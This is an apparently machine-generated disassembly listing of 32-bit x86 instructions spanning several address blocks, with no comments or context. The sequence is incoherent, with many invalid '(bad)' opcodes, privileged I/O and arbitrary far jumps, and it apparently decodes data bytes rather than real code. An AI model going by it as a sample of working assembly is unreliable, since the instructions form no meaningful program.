  418d63:	lods   eax,DWORD PTR ds:[esi]
  418d64:	sahf   
  418d65:	cdq    
  418d66:	ror    bl,cl
  418d68:	out    dx,eax
  418d69:	sbb    ch,BYTE PTR [ebp+edx*4-0x51]
  418d6d:	xor    bh,BYTE PTR [eax]
  418d6f:	push   esi
  418d70:	push   ds
  418d71:	lea    esi,[ebx]
  418d73:	xor    ebp,0x22
  418d76:	sub    BYTE PTR [eax-0x77],ch
  418d79:	lds    ecx,FWORD PTR [esi-0x6342078a]
  418d7f:	sub    ebp,esp
  418d81:	outs   dx,BYTE PTR ds:[esi]
  418d82:	or     esp,ecx
  418d84:	enter  0x7635,0x50
  418d88:	popa   
  418d89:	mov    edx,0xa4c8faf
  418d8e:	and    eax,0x80ce4bef
  418d93:	idiv   ebx
  418d95:	rcl    esp,1
  418d97:	xor    al,0x29
  418d99:	jbe    0x418d4c
  418d9b:	mov    dh,0x5
  418d9d:	mov    ebx,0x6a67c0f3
  418da2:	fadd   DWORD PTR [edx+0x7dfbee0d]
  418da8:	imul   eax,DWORD PTR gs:[ecx-0x475a13a9],0xffffffd4
  418db0:	test   al,0x2c
  418db2:	ret    0x2aec
  418db5:	sbb    eax,0xee0abfd0
  418dba:	fs in  eax,dx
  418dbc:	fild   WORD PTR [edi]
  418dbe:	pop    esp
  418dbf:	jae    0x418d4a
  418dc1:	(bad)  
  418dc2:	jns    0x418d63
  418dc4:	jl     0x418deb
  418dc6:	push   0x55c3473
  418dcb:	enter  0xfb6f,0xaf
  418dcf:	or     al,0x1a
  418dd1:	stos   DWORD PTR es:[edi],eax
  418dd2:	cmp    cl,bh
  418dd4:	push   eax
  418dd5:	(bad)
  418dd9:	ret    
  418dda:	je     0x418db1
  418ddc:	xlat   BYTE PTR ds:[ebx]
  418ddd:	or     eax,0x28f94c9d
  418de2:	lahf   
  418de3:	or     BYTE PTR [esi],dh
  418de5:	aas    
  418de6:	dec    DWORD PTR [ecx*2-0xeb977f6]
  418ded:	pop    ss
  418dee:	out    0xb6,al
  418df0:	or     BYTE PTR [edx-0x8],ch
  418df3:	inc    esp
  418df4:	adc    DWORD PTR [edi-0x5b6dd781],edi
  418dfa:	mov    eax,ds:0xd0755d9c
  418dff:	push   esp
  418e00:	shl    BYTE PTR [edi-0x6489175b],cl
  418e06:	pop    esp
  418e07:	repnz lods al,BYTE PTR ds:[esi]
  418e09:	adc    eax,0xa4ef0c0e
  418e0e:	ins    DWORD PTR es:[edi],dx
  418e0f:	sahf   
  418e10:	xchg   ebp,eax
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x1a]
  418e81:	xchg   esp,eax
  418e82:	mov    ds:0x107e5f2,eax
  418e87:	add    BYTE PTR ds:0xe6000001,al
  418e8d:	push   esi
  418e8e:	pushf  
  418e8f:	into   
  418e90:	mov    edi,0xd93a58a
  418e95:	mov    ch,0x34
  418e97:	cmc    
  418e98:	sbb    DWORD PTR [edx],eax
  418e9a:	imul   edx,DWORD PTR [ebp-0x5e134acf],0xfffffff3
  418ea1:	scas   eax,DWORD PTR es:[edi]
  418ea2:	sar    BYTE PTR [ebx],0xd3
  418ea5:	fimul  DWORD PTR ds:0x780b1161
  418eab:	pop    esp
  418eac:	adc    DWORD PTR [esp+esi*2],ebp
  418eaf:	push   0xcb49db96
  418eb4:	cmp    eax,0xce806af0
  418eb9:	outs   dx,DWORD PTR ds:[esi]
  418eba:	test   eax,0x108254b6
  418ebf:	cwde   
  418ec0:	cwde   
  418ec1:	adc    ebp,DWORD PTR [edx-0x3a54eab4]
  418ec7:	add    dl,BYTE PTR [edi-0x34]
  418eca:	inc    edx
  418ecb:	xchg   edi,eax
  418ecc:	shl    BYTE PTR ds:0x503cd2b5,1
  418ed2:	ins    DWORD PTR es:[edi],dx
  418ed3:	popa   
  418ed4:	sbb    esi,DWORD PTR [ebx]
  418ed6:	jl     0x418eb6
  418ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ed9:	out    dx,al
  418eda:	in     al,0xbc
  418edc:	jg     0x418f0c
  418ede:	or     esp,esi
  418ee0:	push   eax
  418ee1:	imul   ecx,DWORD PTR [ebx-0x3131a4ab],0xffffff87
  418ee8:	scas   eax,DWORD PTR es:[edi]
  418ee9:	out    dx,eax
  418eea:	jno    0x418ed8
  418eec:	xchg   edi,eax
  418eed:	ins    DWORD PTR es:[edi],dx
  418eee:	jo     0x418f1d
  418ef0:	imul   esi,DWORD PTR [eax],0x88745416
  418ef6:	aas    
  418ef7:	fidivr DWORD PTR [ecx+0x25]
  418efa:	outs   dx,BYTE PTR ds:[esi]
  418efb:	popa   
  418efc:	xchg   ebp,eax
  418efd:	xchg   esp,eax
  418efe:	xlat   BYTE PTR ds:[ebx]
  418eff:	(bad)  
  418f00:	fstp   TBYTE PTR [esi]
  418f02:	loopne 0x418efe
  418f04:	ja     0x418f18
  418f06:	test   al,0x8
  418f08:	bound  esi,QWORD PTR [ebx+0x1e47c74b]
  418f0e:	mov    ds:0x37b0cd4b,al
  418f13:	mov    eax,ds:0xfd5c18d
  418f19:	push   esi
  418f1a:	push   ebp
  418f1b:	push   0xb53542d9
  418f20:	daa    
  418f21:	xor    esi,eax
  418f23:	stos   BYTE PTR es:[edi],al
  418f24:	imul   edx,DWORD PTR [edx+0x25],0xffffffcc
  418f28:	pushf  
  418f29:	adc    eax,0x92b6a76d
  418f2e:	fwait
  418f2f:	push   0xf8c51caa
  418f34:	cmp    cl,BYTE PTR [edx-0x5c6cdbdb]
  418f3a:	jmp    0x418f67
  418f3c:	or     eax,0x26345d93
  418f41:	cwde   
  418f42:	sub    eax,0xef57fe72
  418f47:	nop
  418f48:	mov    ds:0xe7b7c88c,al
  418f4d:	add    BYTE PTR [ebx+0x6e23499c],al
  418f53:	jnp    0x418eea
  418f55:	inc    edx
  418f56:	mov    al,ds:0x6b1e6279
  418f5b:	popa   
  418f5c:	jno    0x418ee1
  418f5e:	and    BYTE PTR [eax],cl
  418f60:	mov    eax,0x1f1be469
  418f65:	into   
  418f66:	adc    eax,0x6b4511e0
  418f6b:	inc    esp
  418f6c:	mov    ch,0x7e
  418f6e:	out    0x89,al
  418f70:	cmp    DWORD PTR [eax+0x1e],ebp
  418f73:	daa    
  418f74:	(bad)  
  418f75:	jmp    0x77216a34
  418f7a:	sub    al,0x27
  418f7c:	sti    
  418f7d:	retf   
  418f7e:	xor    ecx,DWORD PTR [ebx]
  418f80:	push   eax
  418f81:	fwait
  418f82:	mov    ?,ebx
  418f84:	sbb    al,BYTE PTR [ebp+0x78617051]
  418f8a:	dec    esp
  418f8b:	stc    
  418f8c:	jo     0x418ffb
  418f8e:	inc    edx
  418f8f:	jmp    0x0:0xdb
	...
  418ff2:	add    BYTE PTR [eax],al
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x48150e59]
  419001:	gs unpckhps xmm5,xmm2
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR ds:0x68000001,al
  41900d:	cwde   
  41900e:	push   ds
  41900f:	popa   
  419010:	inc    esi
  419011:	sbb    cl,bh
  419013:	ds dec edi
  419015:	adc    al,0xeb
  419017:	pop    ss
  419018:	add    eax,0xf18218b8
  41901d:	aas    
  41901e:	lods   eax,DWORD PTR ds:[esi]
  41901f:	arpl   WORD PTR [edx+0x15],cx
  419022:	pushf  
  419023:	sti    
  419024:	push   ebp
  419025:	(bad)  
  419026:	dec    ebx
  419027:	pop    es
  419028:	arpl   WORD PTR [edi+0x542030bd],bx
  41902e:	or     BYTE PTR [ebx],0x85
  419031:	cmp    BYTE PTR [esi+0x4e],bh
  419034:	lds    ebp,FWORD PTR [esi]
  419036:	jmp    0x8f92:0xb9f26117
  41903d:	sbb    al,0x19
  41903f:	int    0x9e
  419041:	push   ds
  419042:	sar    dh,0x67
  419045:	cdq    
  419046:	mov    dh,0xc7
  419048:	repnz mov ebx,0x575e02cb
  41904e:	and    al,0x17
  419050:	loop   0x419096
  419052:	ins    DWORD PTR es:[edi],dx
  419053:	es push ds
  419055:	ins    BYTE PTR es:[edi],dx
  419056:	mov    ecx,0xe4fca82f
  41905b:	sbb    al,0x57
  41905d:	not    dl
  41905f:	aad    0x43
  419061:	xchg   ebp,eax
  419062:	dec    ebp
  419063:	mov    al,0x2f
  419065:	(bad)  
  419066:	out    dx,eax
  419067:	fistp  WORD PTR [eax]
  419069:	mov    bl,0xbe
  41906b:	cmp    DWORD PTR [esi+esi*1-0x113d88b8],esi
  419072:	xchg   BYTE PTR [ebx+esi*8],ah
  419075:	mov    edi,edi
  419077:	push   eax
  419078:	push   ss
  419079:	out    0xc6,al
  41907b:	popf   
  41907c:	mov    DWORD PTR [ebp+0x7bea4e50],esi
  419082:	adc    dl,bl
  419084:	add    edx,ecx
  419086:	imul   BYTE PTR [ebx+0x1b07329a]
  41908c:	jmp    0xd622:0x536968ba
  419093:	fucomp st(3)
  419095:	sub    al,0x8b
  419097:	or     esi,DWORD PTR [ebp-0x60942d27]
  41909d:	lock ret 0xacc0
  4190a1:	int3   
  4190a2:	xor    al,0x55
  4190a4:	popa   
  4190a5:	mov    ah,0x4
  4190a7:	mul    dl
  4190a9:	(bad)  
  4190aa:	jl     0x4190a7
  4190ac:	cwde   
  4190ad:	pop    ds
  4190ae:	adc    ah,BYTE PTR ds:0x6733d598
  4190b4:	push   edx
  4190b6:	mov    esp,0x33c01605
  4190bb:	jecxz  0x41907e
  4190bd:	hlt    
  4190be:	jo     0x4190a8
  4190c0:	xchg   BYTE PTR [ecx],bh
  4190c2:	sahf   
  4190c3:	jbe    0x419137
  4190c5:	inc    ecx
  4190c6:	repnz push cs
  4190c8:	test   DWORD PTR [eax],esi
  4190ca:	adc    esi,DWORD PTR [ebp-0x23]
  4190cd:	ror    BYTE PTR [ebx],cl
  4190cf:	shl    dh,1
  4190d1:	pop    edi
  4190d2:	in     eax,dx
  4190d3:	pusha  
  4190d4:	push   ds
  4190d5:	(bad)  
  4190d6:	push   0x8c3e9d87
  4190db:	xlat   BYTE PTR ds:[ebx]
  4190dc:	ins    DWORD PTR es:[edi],dx
  4190dd:	retf   0xc337
  4190e0:	icebp  
  4190e1:	leave  
  4190e2:	popa   
  4190e3:	fimul  DWORD PTR ds:0xa2950008
  4190e9:	push   cs
  4190ea:	xchg   ecx,eax
  4190eb:	imul   esi,DWORD PTR [ebx+0x33a6ce25],0x2b
  4190f2:	imul   eax,DWORD PTR [esi+0x4b],0x58
  4190f6:	clc    
  4190f7:	dec    edx
  4190f8:	mov    BYTE PTR [edi],al
  4190fa:	inc    edi
  4190fb:	bound  ecx,QWORD PTR [edi+0x57]
  4190fe:	sbb    eax,0xb1407208
  419103:	jno    0x419116
  419105:	out    dx,eax
  419106:	pop    edi
  419107:	and    al,0x4
  419109:	icebp  
  41910a:	stos   DWORD PTR es:[edi],eax
  41910b:	push   ebp
  41910c:	mov    ebp,DWORD PTR [ebx-0x6d]
  41910f:	pop    ebp
  419110:	xor    eax,0x0
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     al,BYTE PTR [eax-0x6f]
  419182:	out    dx,al
  419183:	mov    al,ds:0x109ef
  419188:	add    eax,0x65000001
  41918d:	xchg   ebx,eax
  41918e:	inc    edx
  41918f:	mov    eax,ds:0x75bac6b4
  419194:	mov    eax,0xdfe5b6d1
  419199:	fidivr DWORD PTR [eax-0x61]
  41919c:	and    ebp,DWORD PTR [esi-0x11e304b0]
  4191a2:	mov    dh,0xe1
  4191a4:	sbb    esp,DWORD PTR [esi+0xd]
  4191a7:	ja     0x4191e3
  4191a9:	xchg   esi,eax
  4191aa:	clc    
  4191ab:	nop
  4191ac:	cmp    eax,0xca54a16c
  4191b1:	xlat   BYTE PTR ds:[ebx]
  4191b2:	sbb    bh,BYTE PTR [ebx+0x43]
  4191b5:	mov    edx,0x16cb2983
  4191ba:	add    ch,ch
  4191bc:	fwait
  4191bd:	arpl   WORD PTR [edi-0x5fab285],sp
  4191c3:	mov    eax,0xaae2271c
  4191c8:	addr16 popf 
  4191ca:	adc    ebx,eax
  4191cc:	(bad)  
  4191cd:	xlat   BYTE PTR ds:[ebx]
  4191ce:	push   esi
  4191cf:	dec    edx
  4191d0:	ror    dh,cl
  4191d2:	ds mov eax,cr6
  4191d6:	retf   0x5622
  4191d9:	cmp    al,BYTE PTR cs:[esi]
  4191dc:	jge    0x4191ee
  4191de:	mov    WORD PTR [ecx+ebx*4+0x10],?
  4191e2:	xchg   ebx,eax
  4191e3:	jecxz  0x419204
  4191e5:	icebp  
  4191e6:	pop    ss
  4191e7:	icebp  
  4191e8:	mov    ah,0x94
  4191ea:	mov    dh,0x69
  4191ec:	and    eax,0x36e0a146
  4191f1:	push   esp
  4191f2:	xor    DWORD PTR [ebx],ebp
  4191f4:	jmp    0xc844:0xd1425be7
  4191fb:	pop    edx
  4191fc:	mov    BYTE PTR [ebx+0x3d],al
  4191ff:	sub    DWORD PTR es:[esp+ecx*4],esi
  419203:	stos   BYTE PTR es:[edi],al
  419204:	retf   
  419205:	pop    esp
  419206:	xchg   ebx,eax
  419207:	test   eax,0x7a0f261e
  41920c:	ds jo  0x4191d7
  41920f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419210:	cmovle eax,DWORD PTR [esi+0x78]
  419214:	imul   edx,DWORD PTR [edi],0x34ff819c
  41921a:	push   es
  41921b:	cmp    bl,BYTE PTR [edx]
  41921d:	inc    ebx
  41921e:	mov    ecx,0xd13c8369
  419223:	cdq    
  419224:	cmc    
  419225:	hlt    
  419226:	ret    
  419227:	inc    esp
  419228:	jle    0x419244
  41922a:	sbb    al,BYTE PTR [ecx]
  41922c:	push   ecx
  41922d:	loope  0x419268
  41922f:	cmp    al,0x3a
  419231:	adc    BYTE PTR ds:0xd54a0ed3,ch
  419237:	push   ss
  419238:	push   esi
  419239:	cmp    DWORD PTR [ecx+0x52],esi
  41923c:	lea    esi,[ecx-0x39c45511]
  419242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419243:	cmp    eax,0x3bbbf302
  419248:	mov    edx,0xf0ea1f13
  41924d:	ds xchg ebp,eax
  41924f:	mov    ch,cl
  419251:	fsubp  st(5),st
  419253:	(bad)  
  419254:	mov    edx,0x74926bfa
  419259:	xor    al,0xdc
  41925b:	sub    BYTE PTR [eax+0x7b],cl
  41925e:	adc    esi,edx
  419260:	dec    edi
  419261:	jmp    DWORD PTR [ecx-0x8c0a676]
  419267:	les    eax,FWORD PTR [ecx]
  419269:	loopne 0x419291
  41926b:	adc    BYTE PTR [edi-0x37],0x78
  41926f:	fwait
  419270:	cmp    eax,0x48f6e8a8
  419275:	pushf  
  419276:	retf   
  419277:	xor    bl,bh
  419279:	or     DWORD PTR [edx+0x58],edx
  41927c:	cld    
  41927d:	jae    0x419210
  41927f:	hlt    
  419280:	jae    0x419226
  419282:	add    dl,BYTE PTR [edx-0x9]
  419285:	sub    eax,0x5d01f0a3
  41928a:	mov    ebp,0xbed97446
  41928f:	xchg   esp,eax
  419290:	mov    dh,0x0
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	mov    dh,0xb7
  419302:	or     al,0x27
  419304:	hlt    
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0x27000001,al
  41930d:	sbb    DWORD PTR [edx+0x1143ab1f],ebp
  419313:	sti    
  419314:	xor    BYTE PTR ds:0xdb2e9020,dl
  41931a:	or     cl,BYTE PTR ds:0x907a91dd
  419320:	push   ss
  419321:	jge    0x4192ac
  419323:	pop    ds
  419324:	ret    
  419325:	push   DWORD PTR [esi-0x4d6ab662]
  41932b:	jle    0x41934c
  41932d:	retf   
  41932e:	or     eax,0xb01a4bd7
  419333:	scas   eax,DWORD PTR es:[edi]
  419334:	rol    BYTE PTR [edi],cl
  419336:	pop    eax
  419337:	outs   dx,DWORD PTR ds:[esi]
  419338:	test   eax,0x5be1131e
  41933d:	fstp   DWORD PTR [esi+edi*8-0x65]
  419341:	retf   0xf4ec
  419344:	pusha  
  419345:	add    eax,edx
  419347:	mov    edi,0x5a875ba1
  41934c:	jp     0x419302
  41934e:	(bad)  
  419351:	enter  0x4e52,0xde
  419355:	add    dh,BYTE PTR [ebx+0x13659075]
  41935b:	ror    BYTE PTR [edi-0x73],1
  41935e:	push   ds
  41935f:	outs   dx,DWORD PTR ds:[esi]
  419360:	fadd   DWORD PTR [edi]
  419362:	adc    eax,0x10509429
  419367:	aad    0xaf
  419369:	mov    DWORD PTR [ecx],eax
  41936b:	pop    esp
  41936c:	popf   
  41936d:	and    eax,0x2d28d6f6
  419372:	jg     0x4193ef
  419374:	stc    
  419375:	and    al,0x54
  419377:	pop    edi
  419378:	imul   DWORD PTR [eax+esi*4-0x7215422]
  41937f:	cmp    DWORD PTR [esi-0x1e],ecx
  419382:	mov    esi,0xc9b88b5f
  419387:	bound  esi,QWORD PTR [eax]
  419389:	aad    0x69
  41938b:	pop    es
  41938c:	lea    ebp,[ebx]
  41938e:	jmp    0x4193aa
  419390:	push   edi
  419391:	scas   eax,DWORD PTR es:[edi]
  419392:	add    bh,dl
  419394:	es (bad) 
  419396:	aas    
  419397:	scas   al,BYTE PTR es:[edi]
  419398:	cmc    
  419399:	pop    es
  41939a:	pop    ss
  41939b:	imul   edi,DWORD PTR [ecx+esi*1],0xffffffd5
  41939f:	rol    BYTE PTR [esp+edi*8+0xf3f4c49],cl
  4193a6:	hlt    
  4193a7:	ja     0x4193cf
  4193a9:	pop    eax
  4193aa:	dec    esi
  4193ab:	adc    al,0xe3
  4193ad:	pop    ss
  4193ae:	test   eax,0x58d91504
  4193b3:	mov    al,0x4f
  4193b5:	pop    ecx
  4193b6:	adc    DWORD PTR [eax+esi*1+0x6c],esp
  4193ba:	mov    cl,0x2a
  4193bc:	sub    ebx,DWORD PTR [edx-0x5]
  4193bf:	int3   
  4193c0:	sub    ebx,DWORD PTR [edi+0x1b7b7d52]
  4193c6:	mov    ecx,0x6f47f93
  4193cb:	sub    al,0xec
  4193cd:	xor    BYTE PTR [ebx-0x6e],cl
  4193d0:	call   0x4dc6:0x2768340f
  4193d7:	ret    0xc92c
  4193da:	pop    edi
  4193db:	xor    bh,BYTE PTR [eax-0x49]
  4193de:	loopne 0x4193b8
  4193e0:	cmp    ch,ah
  4193e2:	add    ecx,eax
  4193e4:	in     eax,dx
  4193e5:	pop    eax
  4193e6:	mov    ch,0xa1
  4193e8:	push   ebp
  4193e9:	fsubr  DWORD PTR [eax]
  4193eb:	and    DWORD PTR [ecx],edi
  4193ed:	ret    
  4193ee:	out    dx,eax
  4193ef:	in     al,dx
  4193f0:	in     al,0xea
  4193f2:	lods   al,BYTE PTR ds:[esi]
  4193f3:	sar    DWORD PTR [esi+ebp*8+0x2193e0bf],1
  4193fa:	mov    cl,0xa0
  4193fc:	icebp  
  4193fd:	push   ecx
  4193fe:	aaa    
  4193ff:	arpl   cx,bx
  419401:	inc    eax
  419402:	int3   
  419403:	or     DWORD PTR [eax],0x4c3e97dc
  419409:	mov    cl,0xeb
  41940b:	dec    ecx
  41940c:	xor    DWORD PTR [esi],ebp
  41940e:	dec    esp
  41940f:	jmp    0x419427
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	add    BYTE PTR [ebx+0xbf96aa1],al
  419486:	add    DWORD PTR [eax],eax
  419488:	add    eax,0x54000001
  41948d:	mov    ebx,0x94abeee7
  419492:	test   eax,0xc2d3c713
  419497:	arpl   WORD PTR [ebx-0x1bc6c882],cx
  41949d:	push   ecx
  41949e:	pop    edx
  41949f:	push   esi
  4194a0:	jp     0x4194d8
  4194a2:	out    0x1f,al
  4194a4:	push   ecx
  4194a5:	int    0x27
  4194a7:	je     0x41944f
  4194a9:	call   0x8e5fd0e0
  4194ae:	or     DWORD PTR [edx+eax*4],ebp
  4194b1:	mov    eax,ds:0x6890427b
  4194b6:	aam    0xf
  4194b8:	ins    DWORD PTR es:[edi],dx
  4194b9:	jns    0x4194dd
  4194bb:	xor    al,0x2b
  4194bd:	jmp    0x20767a2f
  4194c2:	pop    ebx
  4194c3:	dec    edi
  4194c4:	ins    DWORD PTR es:[edi],dx
  4194c5:	popf   
  4194c6:	ss int 0x27
  4194c9:	push   es
  4194ca:	xchg   esi,eax
  4194cb:	sbb    eax,0x9ba0d003
  4194d0:	mov    DWORD PTR [ebx+eax*4-0x4d],esp
  4194d4:	xor    eax,0x8014b8d6
  4194d9:	push   ds
  4194da:	mov    ch,0xfb
  4194dc:	mov    ah,0x1a
  4194de:	call   ebx
  4194e0:	dec    edi
  4194e1:	adc    eax,0xe3fbcbe
  4194e6:	and    ebp,esi
  4194e8:	mov    ebp,0xc191bfbc
  4194ed:	or     DWORD PTR [ebx],ebx
  4194ef:	repnz inc edx
  4194f1:	inc    esp
  4194f2:	and    BYTE PTR [edi-0x2c],0xb9
  4194f6:	fist   WORD PTR [ebp+0x5b]
  4194f9:	add    DWORD PTR [ebx+edi*4-0x40],ecx
  4194fd:	shl    BYTE PTR [esi+0x423cd178],cl
  419503:	nop
  419504:	push   ebx
  419505:	mov    dh,0x21
  419507:	push   es
  419508:	call   0xd495:0x445228b
  41950f:	into   
  419510:	outs   dx,BYTE PTR ds:[esi]
  419511:	fmul   DWORD PTR [esi]
  419513:	call   0x519:0xdff718de
  41951a:	fistp  QWORD PTR [esi]
  41951c:	adc    BYTE PTR [ebx],0xaa
  41951f:	and    al,0xa1
  419521:	(bad)
  419524:	mov    edx,0x35e44183
  419529:	xchg   ecx,eax
  41952a:	lahf   
  41952b:	enter  0xca37,0xf7
  41952f:	enter  0x71b2,0x2a
  419533:	mov    ds:0x950f341d,al
  419538:	nop
  419539:	out    dx,eax
  41953a:	push   ecx
  41953b:	sub    BYTE PTR ds:0x4625a034,ch
  419541:	jns    0x419587
  419543:	mov    edx,0x62770593
  419548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419549:	loopne 0x4195be
  41954b:	mov    bh,0x5d
  41954d:	ror    ebp,0xa
  419550:	scas   al,BYTE PTR es:[edi]
  419551:	mov    ds:0xb297b095,al
  419556:	cld    
  419557:	and    esi,esi
  419559:	pop    ebp
  41955a:	jo     0x419574
  41955c:	and    eax,0xf2254f9
  419561:	jl     0x419513
  419563:	daa    
  419564:	jno    0x4195a2
  419566:	cmp    BYTE PTR [eax+0x57],0x29
  41956a:	mov    WORD PTR ds:0x9d869b61,?
  419570:	in     eax,dx
  419571:	xchg   ebx,eax
  419572:	jl     0x419507
  419574:	cmp    bl,BYTE PTR [esp+edx*4+0x7ec23309]
  41957b:	es add al,0x95
  41957e:	sbb    BYTE PTR [eax-0x2d],bl
  419581:	or     al,cl
  419583:	xchg   ebp,eax
  419584:	ficomp DWORD PTR [ecx+ebp*8-0x11]
  419588:	mul    esi
  41958a:	je     0x419561
  41958c:	aad    0xa1
  41958e:	cmp    eax,0x68bb
	...
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	aas    
  419601:	mov    bh,0x1a
  419603:	xor    bh,dh
  419605:	or     al,0x1
  419607:	add    BYTE PTR ds:0xa4000001,al
  41960d:	sub    dl,BYTE PTR [esi+0x7d]
  419610:	data16 jb 0x4195d3
  419613:	and    eax,0x3bdc0e2d
  419618:	fldenv [ebx]
  41961a:	or     dl,BYTE PTR [esi+ecx*2]
  41961d:	mov    bh,0xab
  41961f:	or     ebx,eax
  419621:	outs   dx,DWORD PTR ds:[esi]
  419622:	push   ebp
  419623:	ret    
  419624:	dec    ebp
  419625:	xchg   DWORD PTR [eax+0x67],esi
  419628:	pushf  
  419629:	pop    ss
  41962a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41962b:	sti    
  41962c:	out    dx,eax
  41962d:	jmp    FWORD PTR [edx-0x5a453b20]
  419633:	add    eax,0x1503f4ee
  419638:	and    DWORD PTR [esi],eax
  41963a:	lahf   
  41963b:	stc    
  41963c:	add    dh,BYTE PTR [esi-0x74]
  41963f:	inc    cx
  419641:	ret    0x5936
  419644:	sbb    ah,BYTE PTR [ebx+eiz*8]
  419647:	(bad)  
  419649:	test   DWORD PTR [ecx-0x5fd9caa],esi
  41964f:	pop    ecx
  419650:	push   0xffffffa6
  419652:	jge    0x419699
  419654:	xchg   ecx,eax
  419655:	fadd   DWORD PTR [ebx]
  419657:	adc    DWORD PTR [edi-0x27d3bbbd],0x61
  41965e:	pop    ecx
  41965f:	pusha  
  419660:	loop   0x419663
  419662:	cmp    esp,DWORD PTR [ebx+0x16b1a582]
  419668:	or     al,0xde
  41966a:	dec    edi
  41966b:	ins    DWORD PTR es:[edi],dx
  41966c:	fnsave [ebx+ecx*2+0x5e1ffa2b]
  419673:	jmp    0x75534671
  419678:	(bad)  
  419679:	cwde   
  41967a:	enter  0xace5,0xeb
  41967e:	cld    
  41967f:	mov    ah,0x17
  419681:	test   BYTE PTR [edx],bl
  419683:	bnd jb 0x41964e
  419686:	inc    edi
  419687:	imul   edx,DWORD PTR [ecx],0xffffffd7
  41968a:	adc    al,0x7f
  41968c:	pop    esi
  41968d:	add    bh,BYTE PTR [eax]
  41968f:	icebp  
  419690:	call   0x9c6f:0x3b37b6ea
  419697:	and    eax,0xfc2ca1ea
  41969c:	xlat   BYTE PTR ds:[ebx]
  41969d:	jl     0x41970a
  41969f:	(bad)  
  4196a0:	cld    
  4196a1:	push   ds
  4196a2:	inc    eax
  4196a3:	push   edx
  4196a4:	or     DWORD PTR [ebx+0x5e],esp
  4196a7:	pop    ebp
  4196a8:	hlt    
  4196a9:	cld    
  4196aa:	lea    ebp,[edi]
  4196ac:	in     eax,0xbc
  4196ae:	inc    ecx
  4196af:	mov    eax,0x4dcd319d
  4196b4:	clc    
  4196b5:	loopne 0x4196b9
  4196b7:	add    eax,0x294d42ef
  4196bc:	dec    ecx
  4196bd:	fist   WORD PTR [edi]
  4196bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196c0:	js     0x419713
  4196c2:	xor    dh,dh
  4196c4:	sbb    BYTE PTR [edi+0x10],0xa6
  4196c8:	loopne 0x419711
  4196ca:	shl    BYTE PTR [ebx-0x1d],cl
  4196cd:	and    edi,0x900fca4f
  4196d3:	xchg   ebp,eax
  4196d4:	xchg   DWORD PTR [esi-0x5c],eax
  4196d7:	bound  ebx,QWORD PTR [esi+eax*4]
  4196da:	xor    bh,BYTE PTR [edi+0x4561710c]
  4196e0:	sbb    ebp,DWORD PTR [esi]
  4196e2:	std    
  4196e3:	(bad)  
  4196e4:	iret   
  4196e5:	jl     0x419688
  4196e7:	adc    cl,BYTE PTR [edi-0x44]
  4196ea:	shl    al,0xb2
  4196ed:	les    ecx,FWORD PTR [ebx-0x12]
  4196f0:	lds    eax,FWORD PTR [ebp+0x23]
  4196f3:	jge    0x419712
  4196f5:	xchg   ebp,eax
  4196f6:	(bad)  
  4196f7:	jbe    0x419753
  4196f9:	fs aas 
  4196fb:	es cdq 
  4196fd:	add    eax,0xeb580e42
  419702:	mov    ds:0x59153949,eax
  419707:	add    BYTE PTR [ecx+eax*8-0x58],al
  41970b:	add    BYTE PTR [ebp+0x732dc603],cl
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x548dd0ae
  419781:	rcr    DWORD PTR [eax+0x50],cl
  419784:	add    ecx,DWORD PTR [esi]
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x80000001
  41978d:	adc    BYTE PTR [ebp-0x18a8d1d8],cl
  419793:	loopne 0x4197c2
  419795:	mov    cl,0x19
  419797:	fnstsw WORD PTR [eax+0x7]
  41979a:	test   DWORD PTR [edx-0x3de154a2],esi
  4197a0:	ret    
  4197a1:	fcomp  QWORD PTR [eax+0x50]
  4197a4:	call   0xb8a10a81
  4197a9:	(bad)  
  4197aa:	imul   ebx,DWORD PTR [edx],0xffffffe5
  4197ad:	push   cs
  4197ae:	fcom   st(5)
  4197b0:	jns    0x419735
  4197b2:	popf   
  4197b3:	mul    BYTE PTR [eax+0x54cd1f7d]
  4197b9:	loopne 0x419745
  4197bb:	ret    0xba3e
  4197be:	in     eax,0x8a
  4197c0:	xchg   ecx,eax
  4197c1:	xchg   esi,eax
  4197c2:	mov    eax,0xa62246d6
  4197c7:	inc    esi
  4197c8:	rcr    DWORD PTR [edx+esi*2],0x21
  4197cc:	out    dx,al
  4197cd:	cmp    BYTE PTR [esi],cl
  4197cf:	inc    ecx
  4197d0:	fistp  QWORD PTR ds:0x345f657c
  4197d6:	jl     0x419803
  4197d8:	jge    0x4197e0
  4197da:	jmp    0x8055:0x47e6d25d
  4197e1:	fs dec esi
  4197e3:	fadd   QWORD PTR [edi+0x52]
  4197e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
